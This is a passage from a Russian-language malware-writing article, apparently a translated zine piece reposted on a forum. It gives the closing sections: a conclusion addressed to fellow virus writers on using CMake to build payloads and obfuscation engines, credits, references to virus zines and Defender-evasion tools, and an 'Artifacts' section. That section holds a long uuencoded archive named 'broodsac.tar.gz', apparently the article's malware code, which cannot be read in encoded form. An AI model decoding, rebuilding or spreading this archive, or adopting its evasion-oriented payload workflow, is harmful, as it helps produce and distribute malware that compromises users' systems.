<b>--[ 6. Заключение</b><br />
<br />
Нет никаких сомнений в том, что странные аномалии в разработке, которые вы видите в диких образцах вредоносного ПО, являются побочным продуктом какой-то системы сборки. Использование SmokeLoader зашифрованных функций, безусловно, не является функцией компилятора MSVC[10]. Но даже грубая и быстрая переработка C-файла, сброшенного в каталог для компиляции в IDE, технически будет считаться системой сборки. В конце концов, Visual Studio IDE — это всего лишь оболочка для системы сборки MSVC. Но как вирусописатели, мы, в конечном счете, всё ещё инженеры. Мы стремимся к красивому решению проблемы. Мы в конечном итоге хотим создать свой собственный маленький дзен-сад, за которым можно ухаживать.<br />
<br />
Прелесть CMake, в частности, заключается в том, что он кроссплатформенный. Таким образом, если у вас есть код — например, движок обфускации, — который может быть использован на нескольких платформах, CMake может сделать сборку проекта на каждой платформе относительно безболезненной. Точно так же, как CMake управляет MSVC, он может управлять и сложной средой сборки, такой как GNU Make. Поддерживаются и многие другие цели сборки, но не все так же полно, как MSVC и GNU. Экзотические цели могут вызвать некоторые трудности.<br />
<br />
Надеюсь, мне удалось убедительно аргументировать включение систем сборки в разработку вашей полезной нагрузки. Хотя мы, безусловно, можем обойтись поверхностными shell-скриптами, разве не было бы замечательно углубиться в суть машины на уровне компоновщика? Разработчики Linux имеют эту привилегию, почему бы не освободить этот доступ в Windows? В конце концов, мы все фактически демоны наших целевых операционных систем — мы прячемся на самом низком уровне машины, и нам это здесь нравится.<br />
<br />
<b>--[ 7. Благодарности</b><br />
<br />
0x6d6e647a за редактирование, dc949 за семейную поддержку, slop pit за мемы и оживленные обсуждения.<br />
<br />
<b>--[ 8. Ссылки</b><br />
<br />
<br />
[1]: 40Hex #8: An Introduction to Nonoverwriting Virii, Part II: EXE<br />
     Infectors,<br />
     <a href="https://amethyst.systems/zines/40hex8/40HEX-8.007.txt" target="_blank" class="link link--external" rel="noopener">https://amethyst.systems/zines/40hex8/40HEX-8.007.txt</a><br />
[2]: 29A #6: W32.Shrug, by roy g biv,<br />
     <a href="https://amethyst.systems/zines/29a6/29A-6.615.txt" target="_blank" class="link link--external" rel="noopener">https://amethyst.systems/zines/29a6/29A-6.615.txt</a><br />
[3]: 29A #2: PE infection under Win32,<br />
     <a href="https://amethyst.systems/zines/29a2/29A-2.3_1.txt" target="_blank" class="link link--external" rel="noopener">https://amethyst.systems/zines/29a2/29A-2.3_1.txt</a><br />
[4]: <a href="https://github.com/Adrianotiger/desktopPet" target="_blank" class="link link--external" rel="noopener">GitHub - Adrianotiger/desktopPet: Remembering the lovely eSheep (stray sheep) from 1995 -</a><br />
[5]: <a href="https://github.com/commial/experiments/tree/master/windows-defender" target="_blank" class="link link--external" rel="noopener">experiments/windows-defender at master · commial/experiments</a><br />
           /VDM<br />
[6]: <a href="https://github.com/matterpreter/DefenderCheck" target="_blank" class="link link--external" rel="noopener">GitHub - matterpreter/DefenderCheck: Identifies the bytes that Microsoft Defender flags on.</a><br />
[7]: <a href="https://github.com/rasta-mouse/ThreatCheck" target="_blank" class="link link--external" rel="noopener">GitHub - rasta-mouse/ThreatCheck: Identifies the bytes that Microsoft Defender  / AMSI Consumer flags on.</a><br />
[8]: <a href="https://techcommunity.microsoft.com/t5" target="_blank" class="link link--external" rel="noopener">https://techcommunity.microsoft.com/t5</a><br />
           /security-compliance-and-identity<br />
           /enhancements-to-behavior-monitoring-and-network-inspection<br />
           /ba-p/247706<br />
[9]: <a href="https://en.wikipedia.org/wiki/Leucochloridium_paradoxum" target="_blank" class="link link--external" rel="noopener">Leucochloridium paradoxum - Wikipedia</a><br />
[10]: <a href="https://www.sentinelone.com/blog" target="_blank" class="link link--external" rel="noopener">Cybersecurity Blog | SentinelOne NL</a><br />
           /going-deep-a-guide-to-reversing-smoke-loader-malware/,<br />
           see &quot;Decoding the Buffer&quot;<br />
<br />
<b>--[ 9. Артефакты (Данный артифакт уже распакован во вложении)</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>begin 644 broodsac.tar.gz
M&#039;XL(`````````^P]:W?;-K+][%^!9KNI9$N.93O&gt;[&#039;7L&lt;V1)KG6O+/E(&lt;K*]
MV5P&gt;2H0L-A2I)2D[WC;__&lt;[@10&quot;D&#039;G;&lt;;;MK?6@L&lt;#`8S`SF&quot;;&amp;C.(J\Q!V_
M:ERZGVC&#039;3])D-_V&lt;?O.4GSWX&#039;!T&gt;XK^UO[S&gt;T__%3^WUT&gt;MO:H&gt;O_[)_N&#039;^X
M]_KH&amp;QC9.]C_ANP]*15+/HLD=6-&quot;OIDOXGE`E\.M&gt;_X&#039;_8QG(&#039;9GYH?^;#%S
M8OJ/A1]3K_2NU1^T&gt;UURL%M[7=[:FL?13W2&lt;ED9&quot;6TB#U`&gt;73A?^4]Y*:%IJ
M7-;_I^5&lt;#MXUG/YU=]B^;#F=]EF_WO^1O+A&lt;!*D_G,;4]:CWW=OOWC9ZW?/V
M#__5I*/%S:GXYT5Y*YJG?A26SOJ]7G-0;SC-UMGU#^3%&lt;!&amp;&#039;)`J)AW`W?GA#
M)E%,S@0E+TCO_)S3H&quot;:VN^&gt;MQK!^UFD-R(L7I%%O7+3(8-AO=P&#039;=@*8DG5)`
M$G@T-G&quot;1-&quot;)^.(&amp;-5F#!X)[$-*&quot;W;IB2.S^=$I,P(&#039;C+]3PG68P\8-DXC&gt;+[
MTG&lt;_7_5[_PV+.X/&gt;=;_1&lt;IKM_I=7&#039;&quot;?L[96;S%X=[)&lt;?-_&#039;H4&quot;Q)/]/Q(G5&#039;
M`&lt;T$\K[=/=@G,]&lt;/=\?E+5#I&amp;YHZ@1]^@O^,8C?V:9(!*[P.X&#039;5@GCG`%O(G
MQ!)%&gt;8L0KBYS-YV6ZF&gt;#7N=ZV&#039;*NZL,+4LC\;J]_6&gt;^T_[=E3&gt;W6A^UWJR86
M#2*.)(U!`4K]UE6GWFB1%W__^PO\#_Y3+/WO?BX:__(&quot;D0DFC:/9W`^HX]$)
MG`)D@L:IJ^NS3KL!P,02OSFDX3Y9L28-/7]2*F_]UH=&gt;^\B=ON*J\ZNLL=+^
MU_9?&#039;[S6[/]^#&gt;S_P0&amp;X@6?[_R_X_,D/Q\&#039;&quot;H^1MDGI^F.Y.3[?,L&lt;@&lt;NO-#
M+[I+&lt;H,IC&lt;/`FCT-HM%/.+;U:IM&lt;^N,X2J))2J9N2A,RIQ$PE`3^)TH6&quot;4DB
M-,OWQ(O&quot;[U/&quot;#B,E]);&amp;]^D4C;X?XG,_)E/T(W%2P1,X6H!MIL2-*=CJQ`]\
M&quot;L;:#3V23&#039;&amp;LH8#).)K?(X*$RC&amp;T]G,_24@TF1!7(\^CMV3[U59Z/Z=`!MJ&lt;
MQ3@EY]&gt;=CG/5.G,ZS;[3K`_K6S\C!=&gt;=&#039;GB5#@UOTNDQ#ISU&gt;IU6O4O::$O&lt;
MP/\G]=CX1;W;[(`;2BZ`OH&quot;RL4Y[,&#039;1:W2%XR7;8B5RO%P-EEY&amp;W&quot;%@HE@&gt;Z
MI#-P%VO!U.(NVK,B\*MWO7:3M,(TOF^&#039;5W%T`_Q+C`T,IHL4)!U:C^4^Q%/N
MU]NPQR]Y%E7(]E5N\&#039;BKD+7RL&lt;/,)=\)9_$R/G7`NW&amp;:EC-I*4P!AW18SIYF
M$)RY&quot;37&amp;&amp;,NN(E!X,&lt;PU8`&quot;&quot;[DW:,_=&amp;@E]WVXU&gt;L^6(P.-\$02`K^O.E@#@
M2A8`PWP&gt;N#&gt;2K/&gt;]?I,@`QK10A&#039;`!H=!T@X]^EF,+4+8%?]3\-!FP86;3/4=
MLP\7B#:@3]:8,.#1`F,#C8]M($YX8TK&#039;GP:+F?[XB_CR936=&#039;,&#039;0G]$FV(I!
MZL[F.A9.!/*!&gt;NW9/(K3Q,)KRZH.]-XR43&lt;B(/ES:L!=N&gt;EXV@XA%IPQF+S&quot;
MG$?QG;M&quot;H08TOO7&#039;=.C&gt;+`-(`?-8//RR7.75D2EZF#\ZCG/EW@?`&quot;.&quot;3RUFX
<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="185558364c">[email&#160;protected]</a>&gt;[#LI24`EC^7(&amp;QCP`.9#[2.NK\T&quot;I,`/L-[Z()GSOP_VCU&lt;\/3K4*+J-
M?(]LD](V1*%!$(TOF)DMEY`,)RT?%P&quot;&quot;Z=`A^8,**9X!\).84A-8`QJ#R&gt;=H
M@3?AV$TE)&#039;^`+B!,4B*_Y18!)LG)_G@V5[.-66MP\`&amp;!)J!A$9)&quot;3LSH;#R_
MMQG!IZUFBYP.&amp;9`]&#039;7:T?)^XHKW+#=&gt;]N.PUK\$&#039;`!8\@QV68-S7):[.50-,
MF@;?9!8*H&#039;^@Z9#.YG#&lt;IOL*G#VMD,[5\DGG$)_74XC]P=_39/E&quot;PC?!I`:H
M5DK9/!.Z0L1ZV;*MQG6_/?S1J0_!$)]!1C.P@3C&gt;%&lt;2A]9?K&lt;&amp;#$S*&quot;T6&gt;A9
M&lt;5(?(&#039;%6?@9:(XTT]4&lt;/\O%._&gt;JJ583N?&gt;SSK&gt;;Q-1Z%L!%$&quot;&gt;5ABHFRD-7G
M$!&quot;&gt;^W&amp;2%G*[&lt;\4R4^&gt;\W6TR&gt;U8O6!!1=,&#039;,&amp;!BR7:S`&lt;-%O#:X[0U)R&#039;(A5
MQV!.R/;@`J7&quot;TGO4M`SA^VY3&#039;`J)V]*]O&#039;5ML\0XBMOU(0]&amp;()&quot;=);?C.,40
M$;[KMDY\83;7,&amp;WR&amp;WN2&amp;3&#039;V)QLS+);\IIYDYDA]E&lt;^4C1%?V+AN3,07.:ZL
MA/BBX-4*_`OP@F_V$YA^&amp;ASLB^WFSSL)LB&amp;&amp;K4@?R$0?5&amp;&quot;6S!F4&#039;&amp;-`N6-,
MQFJ$`&gt;3.&#039;[G)1AB$&gt;=A0$IZ:;9T&lt;&lt;B&gt;_\\7M8T#&amp;V8AB4#*E0&lt;:?8MUC1*E!
M]+^:7AVS[`A+4HUW;(Q,%B$+KR`\3&gt;_)/(YN?0\2)I&gt;,W,0?DT8U2&gt;\A&lt;X+&lt;
M*`$HR%_8[%L^&amp;3(NBB&#039;&lt;-F9,C9V=78BQ,-U)@6S,HW@292Z13*-%X)$1A&lt;5H
MB@-I[/HWT[0ZX7&#039;/[E9!1N0X@F!^,H3O0R!&#039;A1YBD`9T!JD9CXNX7_%8Z/%%
M;IIS(8EFE-P$&quot;PIDNBG!BE$&quot;6=S835*DW85L,4TQ:81LA&quot;QN@GLDZT\B6&gt;RW
M&amp;O7!L)16:)F42FFY1,ME];#QKM48]OH.`[FMI.4,O&#039;1;KIXB.7GHLQ_!&amp;\!S
MP(=`:F_H=7%`[JO,J&amp;=G&#039;+03Z)2BY-+`\B6*&quot;#+/.5(LGXZYS!PVL:3I!-GV
M7&gt;6[,Y96;&#039;Z6.&gt;LE/DC2%D$J[`_^N9M1?$+V]`&lt;2@SV.?(&quot;Q+H2@7,6Q#JAA
M`?&quot;RB,1!5;`T*Q==LJJF#Q)=MO9&amp;V#12#3TR*0:&amp;54^Y`2Z9XGO)`&lt;ME-HO#
M,&gt;-7TC!4R%Z%K)IGT?&gt;%21P-N&#039;ETXVAFB)HINY0S@A&gt;(64[&gt;YF!&quot;J,@I&lt;:9/
MN$#(+[^(4\[U58Z;+!1\UK:ISRG8IUA58P^C4Y_%GYEK&quot;QW1QDV=XAP2GJ_P
M5-CL$;#K.;3L&#039;.199K,&amp;_BS40F2M/F!OB&gt;&amp;1&amp;:HA3D:?8.%Q?K4O6YH9!!?@
M:$RR%UG&amp;S,+GNMI+QIF&quot;7B9ER0&quot;#FK?$V*JE0:;U%#*0:&gt;5V&gt;4&gt;MK%M(&#039;7^9
MZ5W&amp;\ZKY%*!S&amp;,I2A?PPH3&amp;6]22)&amp;,-%_-A5A;A=WM2Y\6]I&quot;(\]^IGU;&#039;C1
M4+I&amp;6]\XX@&gt;H&amp;T-&lt;$0Y,$+/RM$J&quot;5QU4F,@)/LW+_N7+_-BW.:.9(5IJ&#039;:3J
M;DL:+=^C:;$F@@JI*9V6Z@#!I*5G@K*&quot;^&lt;L/A&#039;WDM?4KN2WOU,HVK[Y=&lt;T1!
M;&gt;XH\2+BHV+X&quot;;ES[UG!-Z:W*!`O8O%$&amp;(%ZR+C]%;/F/RT@]66-0*9U/*S#
ML!VX5I)Z&lt;%([)OY;FX(JH^V8[.SX4D!:44O,3&gt;*QP_&gt;0WT+5K]:.&lt;S.\)%TQ
M0X/G&gt;@D+`*&quot;(;F0.7W2`UYU?16FYG%L$:&#039;J:1=3FC$5T90.(&quot;M*R2K^^9)JE
M3WT,09R8-5HM?=LLNJ6Z85+N7UF0G(O#*0\U.2MMC#`&gt;2P[$4FM3&lt;(*J-=OV
M?R43[;HP(8_2$4XQ6(%&quot;C(4SBH\F;+&quot;L8H`&#039;F:!J34E]ODBFNLR%ZZ&amp;A)S.Q
M9&lt;+&#039;F9N(_DG]B^7L5NY2:?TF*@Y_P-&lt;U6_;H/Q9TL9&#039;&quot;;[;K94HMR?O6!-,5
M.7&gt;BN?LJ.M^F?K`C:S!NCS-(E=HGX&gt;W!?LTUZKS\KH+8B(*&lt;NLGTU@TP1/[\
MIE8;_]4;O^;KW4U]R&amp;Q+8E[FYJ4+D3/_[T3BWMDYMIYM(]H:=M7_&gt;J!Y6Y&amp;[
M&quot;&quot;A&amp;NJ@-8F7&quot;F&lt;?1V!G=._A&lt;;.&amp;J?5G_H&gt;4T&gt;P/GHE5OMOIDQOJ&#039;%7,G9544
M8T?@,[9BB+K5@LKADJL6F&gt;#.(&amp;4&#039;[OMPV.ZQP)RZH)&amp;H6-P&lt;`6CHSJC&#039;-K2M
MZA.)+&#039;]X9,3ZMZ39Z&gt;SB&#039;S$E/M9$&lt;!9QX]B]KV38U&#039;&gt;)SU48^3.&amp;(EL:OV2(
M@+PXI@&#039;K4HM`4X&lt;4*+652.E3&amp;-T!ZH0!1[&#039;GAR`-]@Q&lt;&quot;4AV/,WJ.!D^&amp;&lt;=:
MFU94,&quot;:A,D2+6%Q744`2K&lt;^8&amp;-^ZQ/4\[-(2`Z&lt;UZ_L$T&#039;ITEP=%:D$Z8?=_
M;BG(9DYC;(0QM$*OF:R):-1M9]P2G,N$)&gt;)M+PC(`F0=8/B%13UX`I$KIZ5&quot;
M6-!UYR?`AE2@Y!J:D&#039;`1!+LBZ&amp;*&#039;D&amp;DC5\;N4.CB@&amp;R&#039;J2/;^&quot;H,609;,0&amp;4
MMZEPE2[O\&#039;_!##K!Q`WI&#039;?&lt;1.KK6WZYZ_2%&gt;RF+&gt;ZT&gt;P4TS7G4S7%1DR25PY
M73JR-91EVZR&gt;]N:\8,=+BKO8AVO*U3^(XRH7X.U&quot;L&gt;[&#039;W7=^G&quot;[&lt;H,X5!)?6
MM\B;&amp;=LH46?..[HYK@J8RAIZ;:Y43\6:O0GVM1-]66U5&lt;6!RJS[)HCV!O&amp;#+
MF&gt;(^^7;/)6KA35CZH&amp;RG?[*&#039;&quot;41^?G&lt;Q&amp;]%8&lt;&quot;O+)&#039;XVE(K[%W8&quot;+;I%8W*=
M5NF2_N!_%&quot;0*3RI]&amp;4*5T0UQ0Z_B+31+?KB@:I+P+F)1V71:0X-B_0=#`X&quot;:
MC^6\Y^*E)AZ2`,9;5@\0V7[_71WMCBL\E&quot;PN@15TL38^22C+XKA(P4XZ:&gt;3P
MX9**0:1S4T#&quot;L5W9UN1@GQ29G@*XBA&#039;IZMY3A+I%SW-NMVQ;)9$69$3(.BO^
M$TUX-[6\([YQ=.?M3DOB,TQ*UOK8Y?=73!O#%N0H!D!KN]&gt;5P&lt;!V(JZ+LENH
M.=MW531)FKRGYLN.Q0MAWM2A4SD[.W)+MB_/G;C84G#T\&amp;B@EX5$R]@\:*QE
M7[%J@Y!OUP&#039;NY)Y?^LE8`J%$M&amp;,GZ\^`N+J6@IT\A+BK,XSZ[AV_]F$?,E6S
MY3TVYLDA#,+BK&gt;[&lt;LR&#039;&quot;I1_2,:SI@@]$?F.HXH=X!&quot;%F&amp;W8&amp;6CBHD@.&amp;WTF#
MQ-&#039;PK\H1I)H4*R,H@2/VJ\W11AT&gt;Z;-VLQN/ITYRYZ?CJ1:;,]T;W0-5PHJ&lt;
MK--3KF&#039;J_M+/INIGEN#H$`XK7I19\IQ9%+QF@^+0SK5J,-Z(&quot;^O=H;JYB&#039;RF
M+@1_N!D1+:%^&amp;GOCZV4(=Y&amp;,%2;KZ+&quot;B,&gt;&quot;1YHD&amp;&quot;2U:&amp;7:YTEA^_&lt;JKI`%J
MF,5&amp;P`30O)Q$#!@@%V&quot;45%!3YVF&lt;$PFJ]R-D(M#M,C)L3&lt;NK;?$F&lt;OS6L#)N
M/P+KP7[&amp;2Y&#039;3`3;M!$,H`!N%$YZE&amp;RRA&lt;&lt;$C43CO\CB&#039;-Q6\T`L@\#&quot;&quot;0!_,
MELJE=)O&quot;^93U+[,GA15JP\GQ-!RF&lt;Z\MKO.C@3PAVGZKIZ9Q5#LL\`Z&#039;!2&amp;7
M7KQA1+S4R(1OV;IF&#039;%4@&gt;$)T*G=.R!NIA)H&lt;&lt;T&quot;&#039;PE1G@A$&amp;6F&lt;7;@9OOR&quot;#
M\1K,R!U_4B;;%.)RW91[Y@R5:`1+#:W5(MV&amp;B[=D&lt;;6J;6UR20N[&#039;ZM=J96B
M`]1J-1&amp;RG9CK5]&gt;*5%AR(!&#039;MLYH,WS/3HP%4UAT0+20IH&quot;^3M:S;&amp;&quot;OJ31JM
M![!6F?0]ZP5Q@Q&lt;[*MI3^RF$A2=9B&gt;B+4B*I:YM*^V!_$VDCU+]&gt;VBR;6B%L
M_OS?1M:XG8U%+8R%1R&#039;LF^&amp;M%C0%@0OIF!;&quot;&quot;0L1Q?X-JUGEHCMN+41BA`\%
M4[+2ZS(KHD.#5,S4*]N#\/#9P#HCLDGEXZP^:/5;G5ZCJ/A!9/VC\#@\&quot;=D%
MI^&amp;)R=;24YSEL&amp;EUC(OQFAC5(NM&lt;Y&amp;7!5X@&gt;?&gt;G;+QN5:0NM?2R-&lt;_!0$K0C
MR^L$-H;R3FYYGK*&gt;P&lt;&quot;GL@K-A&amp;MTT8#HRCQ&quot;,$.9V8C,GK63F=TWVI9&#039;CX4;
MF%3IX0&lt;\WE]^&quot;)Y&gt;CW&amp;[:`XRNM=$W+_2@EMY\&gt;94P8H^#&lt;,G:FOE#WL?R4NR
M]_D&lt;/WM[_!;:*B$3DQ0A&lt;!^L&amp;TH\NJ4\^=2$SJ)._#G8&#039;&#039;_@@89NEMT=66+I
M.&#039;790X&lt;7XY4&quot;FY7!3&amp;%S^FHHR_;^\I)$D&gt;X5UQ\*E$QS.)KVAT3^.E??IKK+
M(*V&lt;ML$/_D?88ZFV1]Z^);7],OF%E);+D&quot;@A^DJ(9C/&gt;U,QB*LE%^X&gt;+3N_]
M`VD\&gt;&quot;(2S9LHV64N&#039;0WO\ZG[FKQP&lt;;`_\E-6OA!1Q).4+KZR&amp;D&amp;^KEKY]0GX
M[[LR65R2_)I=VW7&#039;+&#039;66G-#&quot;S.P*KC!;(PKQ%E&lt;H&lt;2N;&gt;:RB3&quot;V&#039;)XL)E^7P
MFC;8=0V\=X&gt;JJW&gt;NU$W.XBE(@#$E,[X3K14;X-WZ&gt;SC6QB;$3V_]5,L[O[*M
M!?3E*IZY=GG1/DU=L+9I*(,9]&gt;5BO2?[/#TGLGM4^MV&#039;ESD95O(&lt;JJQ6*[TO
M8U:)F&lt;#QRJ&amp;\C1EZ1B%&quot;NX!)LFH/6YO?8EU&gt;ZA$FKJRN(NJSLT+&#039;.A0L&lt;&gt;(%
MHR+5#9$9UN&#039;#38@&#039;F`E$$\)SQ;PZYU5-W$+!3D#N(&lt;0TJ1NG*J,6]?B\!A=&gt;
M4&#039;HIN58@O^II*_1R&gt;*L;DU`V\W1&lt;150#-MY$=95&amp;Y^H!NH;*?8G;^&amp;L/HR(/
MQ*KFJJMOIJHJ6&gt;-+`7+5L9SHL[&lt;%S+Y&quot;R@4EDYR(&quot;TLOF^%Z&amp;*&lt;+:B567*M5
M2];SWBA=9.41+]JH#&amp;(&lt;70T9HVAG)\,G.)^C64LT&#039;[=(%@CF2SI\#28J4XO&lt;
MP+\1]UM0U?&amp;&gt;#E[5@5@0?_M&amp;#JO(-S**%J&#039;GHA*-Z-A=))2TB3L#&#039;[J(H]0?
M&quot;X42(0)#286X49_ECV9LA39^N5`\Z\_DT$C!BZ$@=B@=@O(LQ9%92)I@#.4G
M+&#039;$BZF8(9C&quot;*&quot;2L*S%FQC^%7!14[G#DN`,9WLFQ0RH&gt;4W,)?A(R&amp;GE;4M/#O
M+.%U4=!5R#,%;1S9W6+SN(2$C4]R?ITBBW^2W_NF:Q3[=G&#039;[3?UJQ^`Q&gt;[BQ
M&gt;#GTII+5&lt;2\5BY%?+&amp;&amp;3XE%;7*0W:7D@&gt;[@EP&amp;*#H(49`]L&quot;Z`&amp;O3;9]6(OV
MA&lt;&gt;T&lt;*;1I!.BXFUW\1:O+/#&quot;($;\DL%75Y59[L&#039;O%4[,.(W;/EO&quot;^6+]&amp;B%;
M#FV]G*T5CF4BS!S2/&#039;#&#039;=,I?UX;W6^MG]6:MV:H?Z^F[?KW9MOU[,*0AR2P&lt;
MWC8DO#HNU=UB!0C/3[]/2!BE*L&#039;)Q&amp;I6&#039;ZQ5,X=:_F`\VLTNE7_,AP1JVC]I
M&#039;*E?9V[DXU[B%,MI):)5C&lt;FEO&quot;`JI(XG.PN&amp;EN&gt;:UJ\BC46Q*EH[.B:O7K%F
M;^V(!6X)F&lt;,W5##I`T&#039;Y[N1OC.^H&#039;WO8#)ZZ&gt;+4\2&gt;AL%-P+_P%_N!,0&quot;7BY
M&amp;]&lt;/*\IQEM&lt;&lt;[&quot;PR.LGKX`//=TR9NK!#I6O?K8L_368O`Y0\U&gt;[=`EMQ@G&#039;V
MW/$X@J!)GE#QWI0&quot;&amp;RK?O[&gt;Y&#039;94S-K&gt;EYAHBF]I0@_&lt;^*J.I+_Q`WV6KEGK+
MS*Y1T]655EI8_LL.6TFKI_:5J2RB%2]WL-&lt;MV]3((G/F/M&lt;BR$6$!I6BP,QN
MO3,0]LN$U6[!)N+/JQC+7HB@$&quot;_Q(S9&amp;C/PVQEE](N+*Y9Q0\8ZJ.X8C[B=P
MK&#039;E]7K]-+EE9(.N&amp;-?5$U@`;7:?1&#039;3KX.BWRBS78[K:&#039;;?862O[Z$`/@LG7I
M]%OU9F[P?;\];.5&amp;6W]K-:Z&#039;+&gt;.&#039;Y)B\&amp;E3BW=T*&gt;3&amp;*]_;8&amp;THKY$V&gt;&quot;V;$
M+()K#*?13(S`&#039;V7EOZ&lt;OEJV_&#039;[-B4&gt;U-9\H]&lt;;L41&#039;&gt;0,PB#)!H[\#DN[D0+
M2R=_0X`O!X&#039;C&lt;Q/Z$W^,[UR5&gt;C&quot;Z1Y,<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="560c6116676f1f6f6619177802">[email&#160;protected]</a>=IO;;(HE+_-DB2-V0
M1HL$&#039;8I83LYB9U,LYS/R2^Q7$#Z[F&gt;3.YW$TCT&amp;J^&quot;,(N:+Z&amp;&lt;54OC&gt;0HP%!
MS=A;YOC!XY)ZRNNF&amp;PI@I^`VJFT1C5M)&amp;^)=&gt;&lt;(%U&lt;46Z&quot;&amp;T&amp;SG\0Q:L_CH;
M,2]PK;MD^U93&gt;&amp;WWQBE8@\.,U4S5MNQADOUH2O_-C1OHOSR4K9ZUEL/2H8SF
MHA10=\-HK5EU3%XV4^](9O4`L\)K7[39L-*[W/.4&lt;Y;7#&amp;!6W&gt;R!^+B@&quot;+Y!
MQ?MQR^U8E0FM2EGT&gt;@95U_WZ1:UDJF*6RI&gt;OG@7U7TV&quot;&#039;6MB`J9&quot;/?8:PKV/
M%2OZLWYVJ?5C%6N.5P!DU,N7Q[!+[3:I1?W&lt;H\,_2#^7W27?H)_[)%&gt;YG_NY
MOXM^[M&#039;ABGXN*,1#^[FH0_\!_5SK&quot;#SW&lt;_-J]4?NY_)+S\\-W&gt;&gt;&amp;[G]P0]?^
MJ4-!1U?^V.&amp;YI?O&lt;TGUNZ3ZW=)];N@]KZ;YY2$OWS=J6[ILE+5VM0/QOW&lt;_E
M[LANZ#;V:LW&amp;WOEYJ_4&#039;:.D*C_K@GBZ?]]S4?6[J_O9-7:7#OVI7]^CPN:O[
MW-5][NH^=W6?N[K/7=WGKNYS5_=WT-55=&gt;_GKNX3=G4AU+.[NB+Z^PVZNIQ,
MA[O;]:W&lt;Y]_=_COT:8N)PK&gt;=2$4!FEZ:AGM#-U[%_V7BTB4T57ST&quot;A^U&lt;$M7
M;94WZONHGMJO\H-\S00PK&amp;M!7J.;?K&#039;&amp;8[(;2=_79S42$SBM1R8S#Z=%ZQR&amp;
MX!893L8&lt;)ASTO&lt;I&#039;BY+XT@!^A6AQ2[5\GL#?RJR*#&#039;FQ%.1).;&amp;?%+`PGP;G
ML@135W)EA8&gt;KDK6-6X[Q`4FR1&lt;/CP]25!9.5NE48C#X5C4+5E@503&amp;;LY913
M-\%0IL)&gt;(F@TB%:L=NG&gt;^&amp;/LH&quot;GWTKOZ?_:&gt;M3N-(TM_7?^*MK(C@X40;TGV
MVCDM:$E,$!!`=C*6MT_3-!(;!`S=&gt;DTF_WWKUJ/KV=&quot;2&lt;.(YQWU.(E./6[&gt;J
M;E7=JON&quot;+&lt;INN:&gt;-7KGDHN1F7;Z&#039;&amp;%BX)-\6^,QD)Y^HW\3&gt;,&quot;G2ULKQ?9;W
M(SS&#039;K#GL7_&amp;]=6RW^DZR%Z?D&#039;NK:7H_HH&gt;SGUG3VURI&amp;GU`T+?OU!V;0.Q?&amp;
M11&amp;8OP:7^8*[%8%GAJ=&gt;V6D2\]@&gt;,1?T21I-0*!TC-A*3/#QFC34E(V7V4_H
MD+)T2/BUE#&gt;.V*\[&lt;^BTHY&amp;%HF`@,L=2&lt;#@&amp;2OZ57%GU2P.@)&#039;Y:!9&#039;342-M
MK&lt;(X@7%6JX@&gt;XRA)Z-&#039;L\/XS84P^&lt;&quot;^K6.?@/G&quot;&#039;-^-QL.0A(&amp;Z#Y63\8+BQ
M:K$DWHSF(5T8*HO-`1N80.YNBP,`QO`:[X&quot;OW@LM]9LG;7MPWG.4^()\VY#&amp;
M(UV$`6VQYY)P%V9:1C7FW$T;&gt;Q^=%QY&quot;,^!]06VMZ0H=?&gt;:3%COX8UP$XNKH
MK*&quot;F[H+7()JA(B\RS\&amp;(1()`J/LWHANL_\1;1=)D6&amp;MFXZ^Y43`&quot;B+&gt;-ZT5&amp;
MYKU,3\ZFF)DR(8A;_6(1S&quot;!V&quot;CX!U4!%$`!D@E5_YA#C=?J`X(U!KH&gt;CGP%U
MT&amp;?2S&quot;2RKB$&lt;+`CZ0JPP(3Z0DGO+U[FS,$$ACAI#N$X(X`9&gt;A6\NK]!9=HL2
M1R+Y@A]B_/0[%&amp;\S:`RF\ZEP7&amp;WF&quot;O.\Z\LFKBZR=(5&quot;0C.+(^1&amp;5QYAR;UK
MQ(&#039;C5WDBR:47&amp;CYL.3/-Y&quot;@%P/L@CJ&lt;W&gt;QU9=QZ^*2%RRDA4`5P&quot;/FX$VJ`4
MJO3TPWN++T\Q_B4ZA[&quot;&#039;&gt;&#039;A`HB&lt;1*`)X&gt;I!&amp;(4`4^I48&#039;&gt;H&#039;5(#$]!UEW#.W
M^&lt;M!#9?I=ITC:Q$,A2T%I&gt;1&lt;T,T&lt;C&lt;/1W7PYRA3NRP5X-?LAF,I@[+-&amp;K;(&gt;
MSF7X3PJG1N&#039;,1I,Q4&gt;8^1MBZJ*C;:O2(`&amp;LZ$GS7ZODYU,KNA]:(1ADE!5BF
M.[&quot;/T-Z+N45K.D&#039;K&quot;HVGI&quot;*=6#R&#039;VMW]T)Q!9._.$I&#039;:&amp;&gt;9,6@A(_G@ZF?VV
MMKTX1&#039;B:UE+@$Z,OH=5&quot;J(04H\0,SH&lt;)4&lt;DY7GKT\IP6_TH^83CSD6/=W/W0
M`*6$,`#UX_MJ&gt;5@J[!?&amp;4OA&lt;,=@Y;]T4&amp;/W9[8_V*P&gt;E&lt;;6JML_&quot;J,O-*P&#039;7
MG]UZ;5P9%&lt;N&#039;!V+K/$([;UN+X_[LEH&lt;CW_,/_4!L60C]SIO6(L0_N^E*)1@=
M%(M2IUE8&gt;=ZN&#039;&#039;?^^716&amp;?O^8:4L-AJ&#039;JQ&gt;\D\H1[9_=[/ZXL.]7*I+\PI_.
MP^`4&#039;0G2#//$#34]]H9&gt;H5!CE&amp;V(2!?&gt;^LOHC+W4)X)7]X/,%JF9&#039;TVG6Y)4
M!%\F.2CR.ZD[8O-XAJH&#039;?FF_,E+(0@9)$]+&quot;&#039;(Y+M6&amp;Y4E6#&lt;W.`\&quot;LMM,/#
M81EQ1T,16A@M9[XG!&#039;.E&quot;:DQ+`9!;5P*5)@3Q,[*0&quot;$E+52TJ?K5(3E]!:C3
M8&quot;;!1+]3S\[!T&quot;N/#O=U*9@PW_AW6HA&gt;I&gt;H&#039;OB9/),POAXA^IX7H#P\*OE^H
MJ3B*(TE^I\9Q7/8]K^`EKJ&#039;P*IBBE?&gt;4142K:JL(=F&amp;L6=?UHBL.LG]Z(F8D
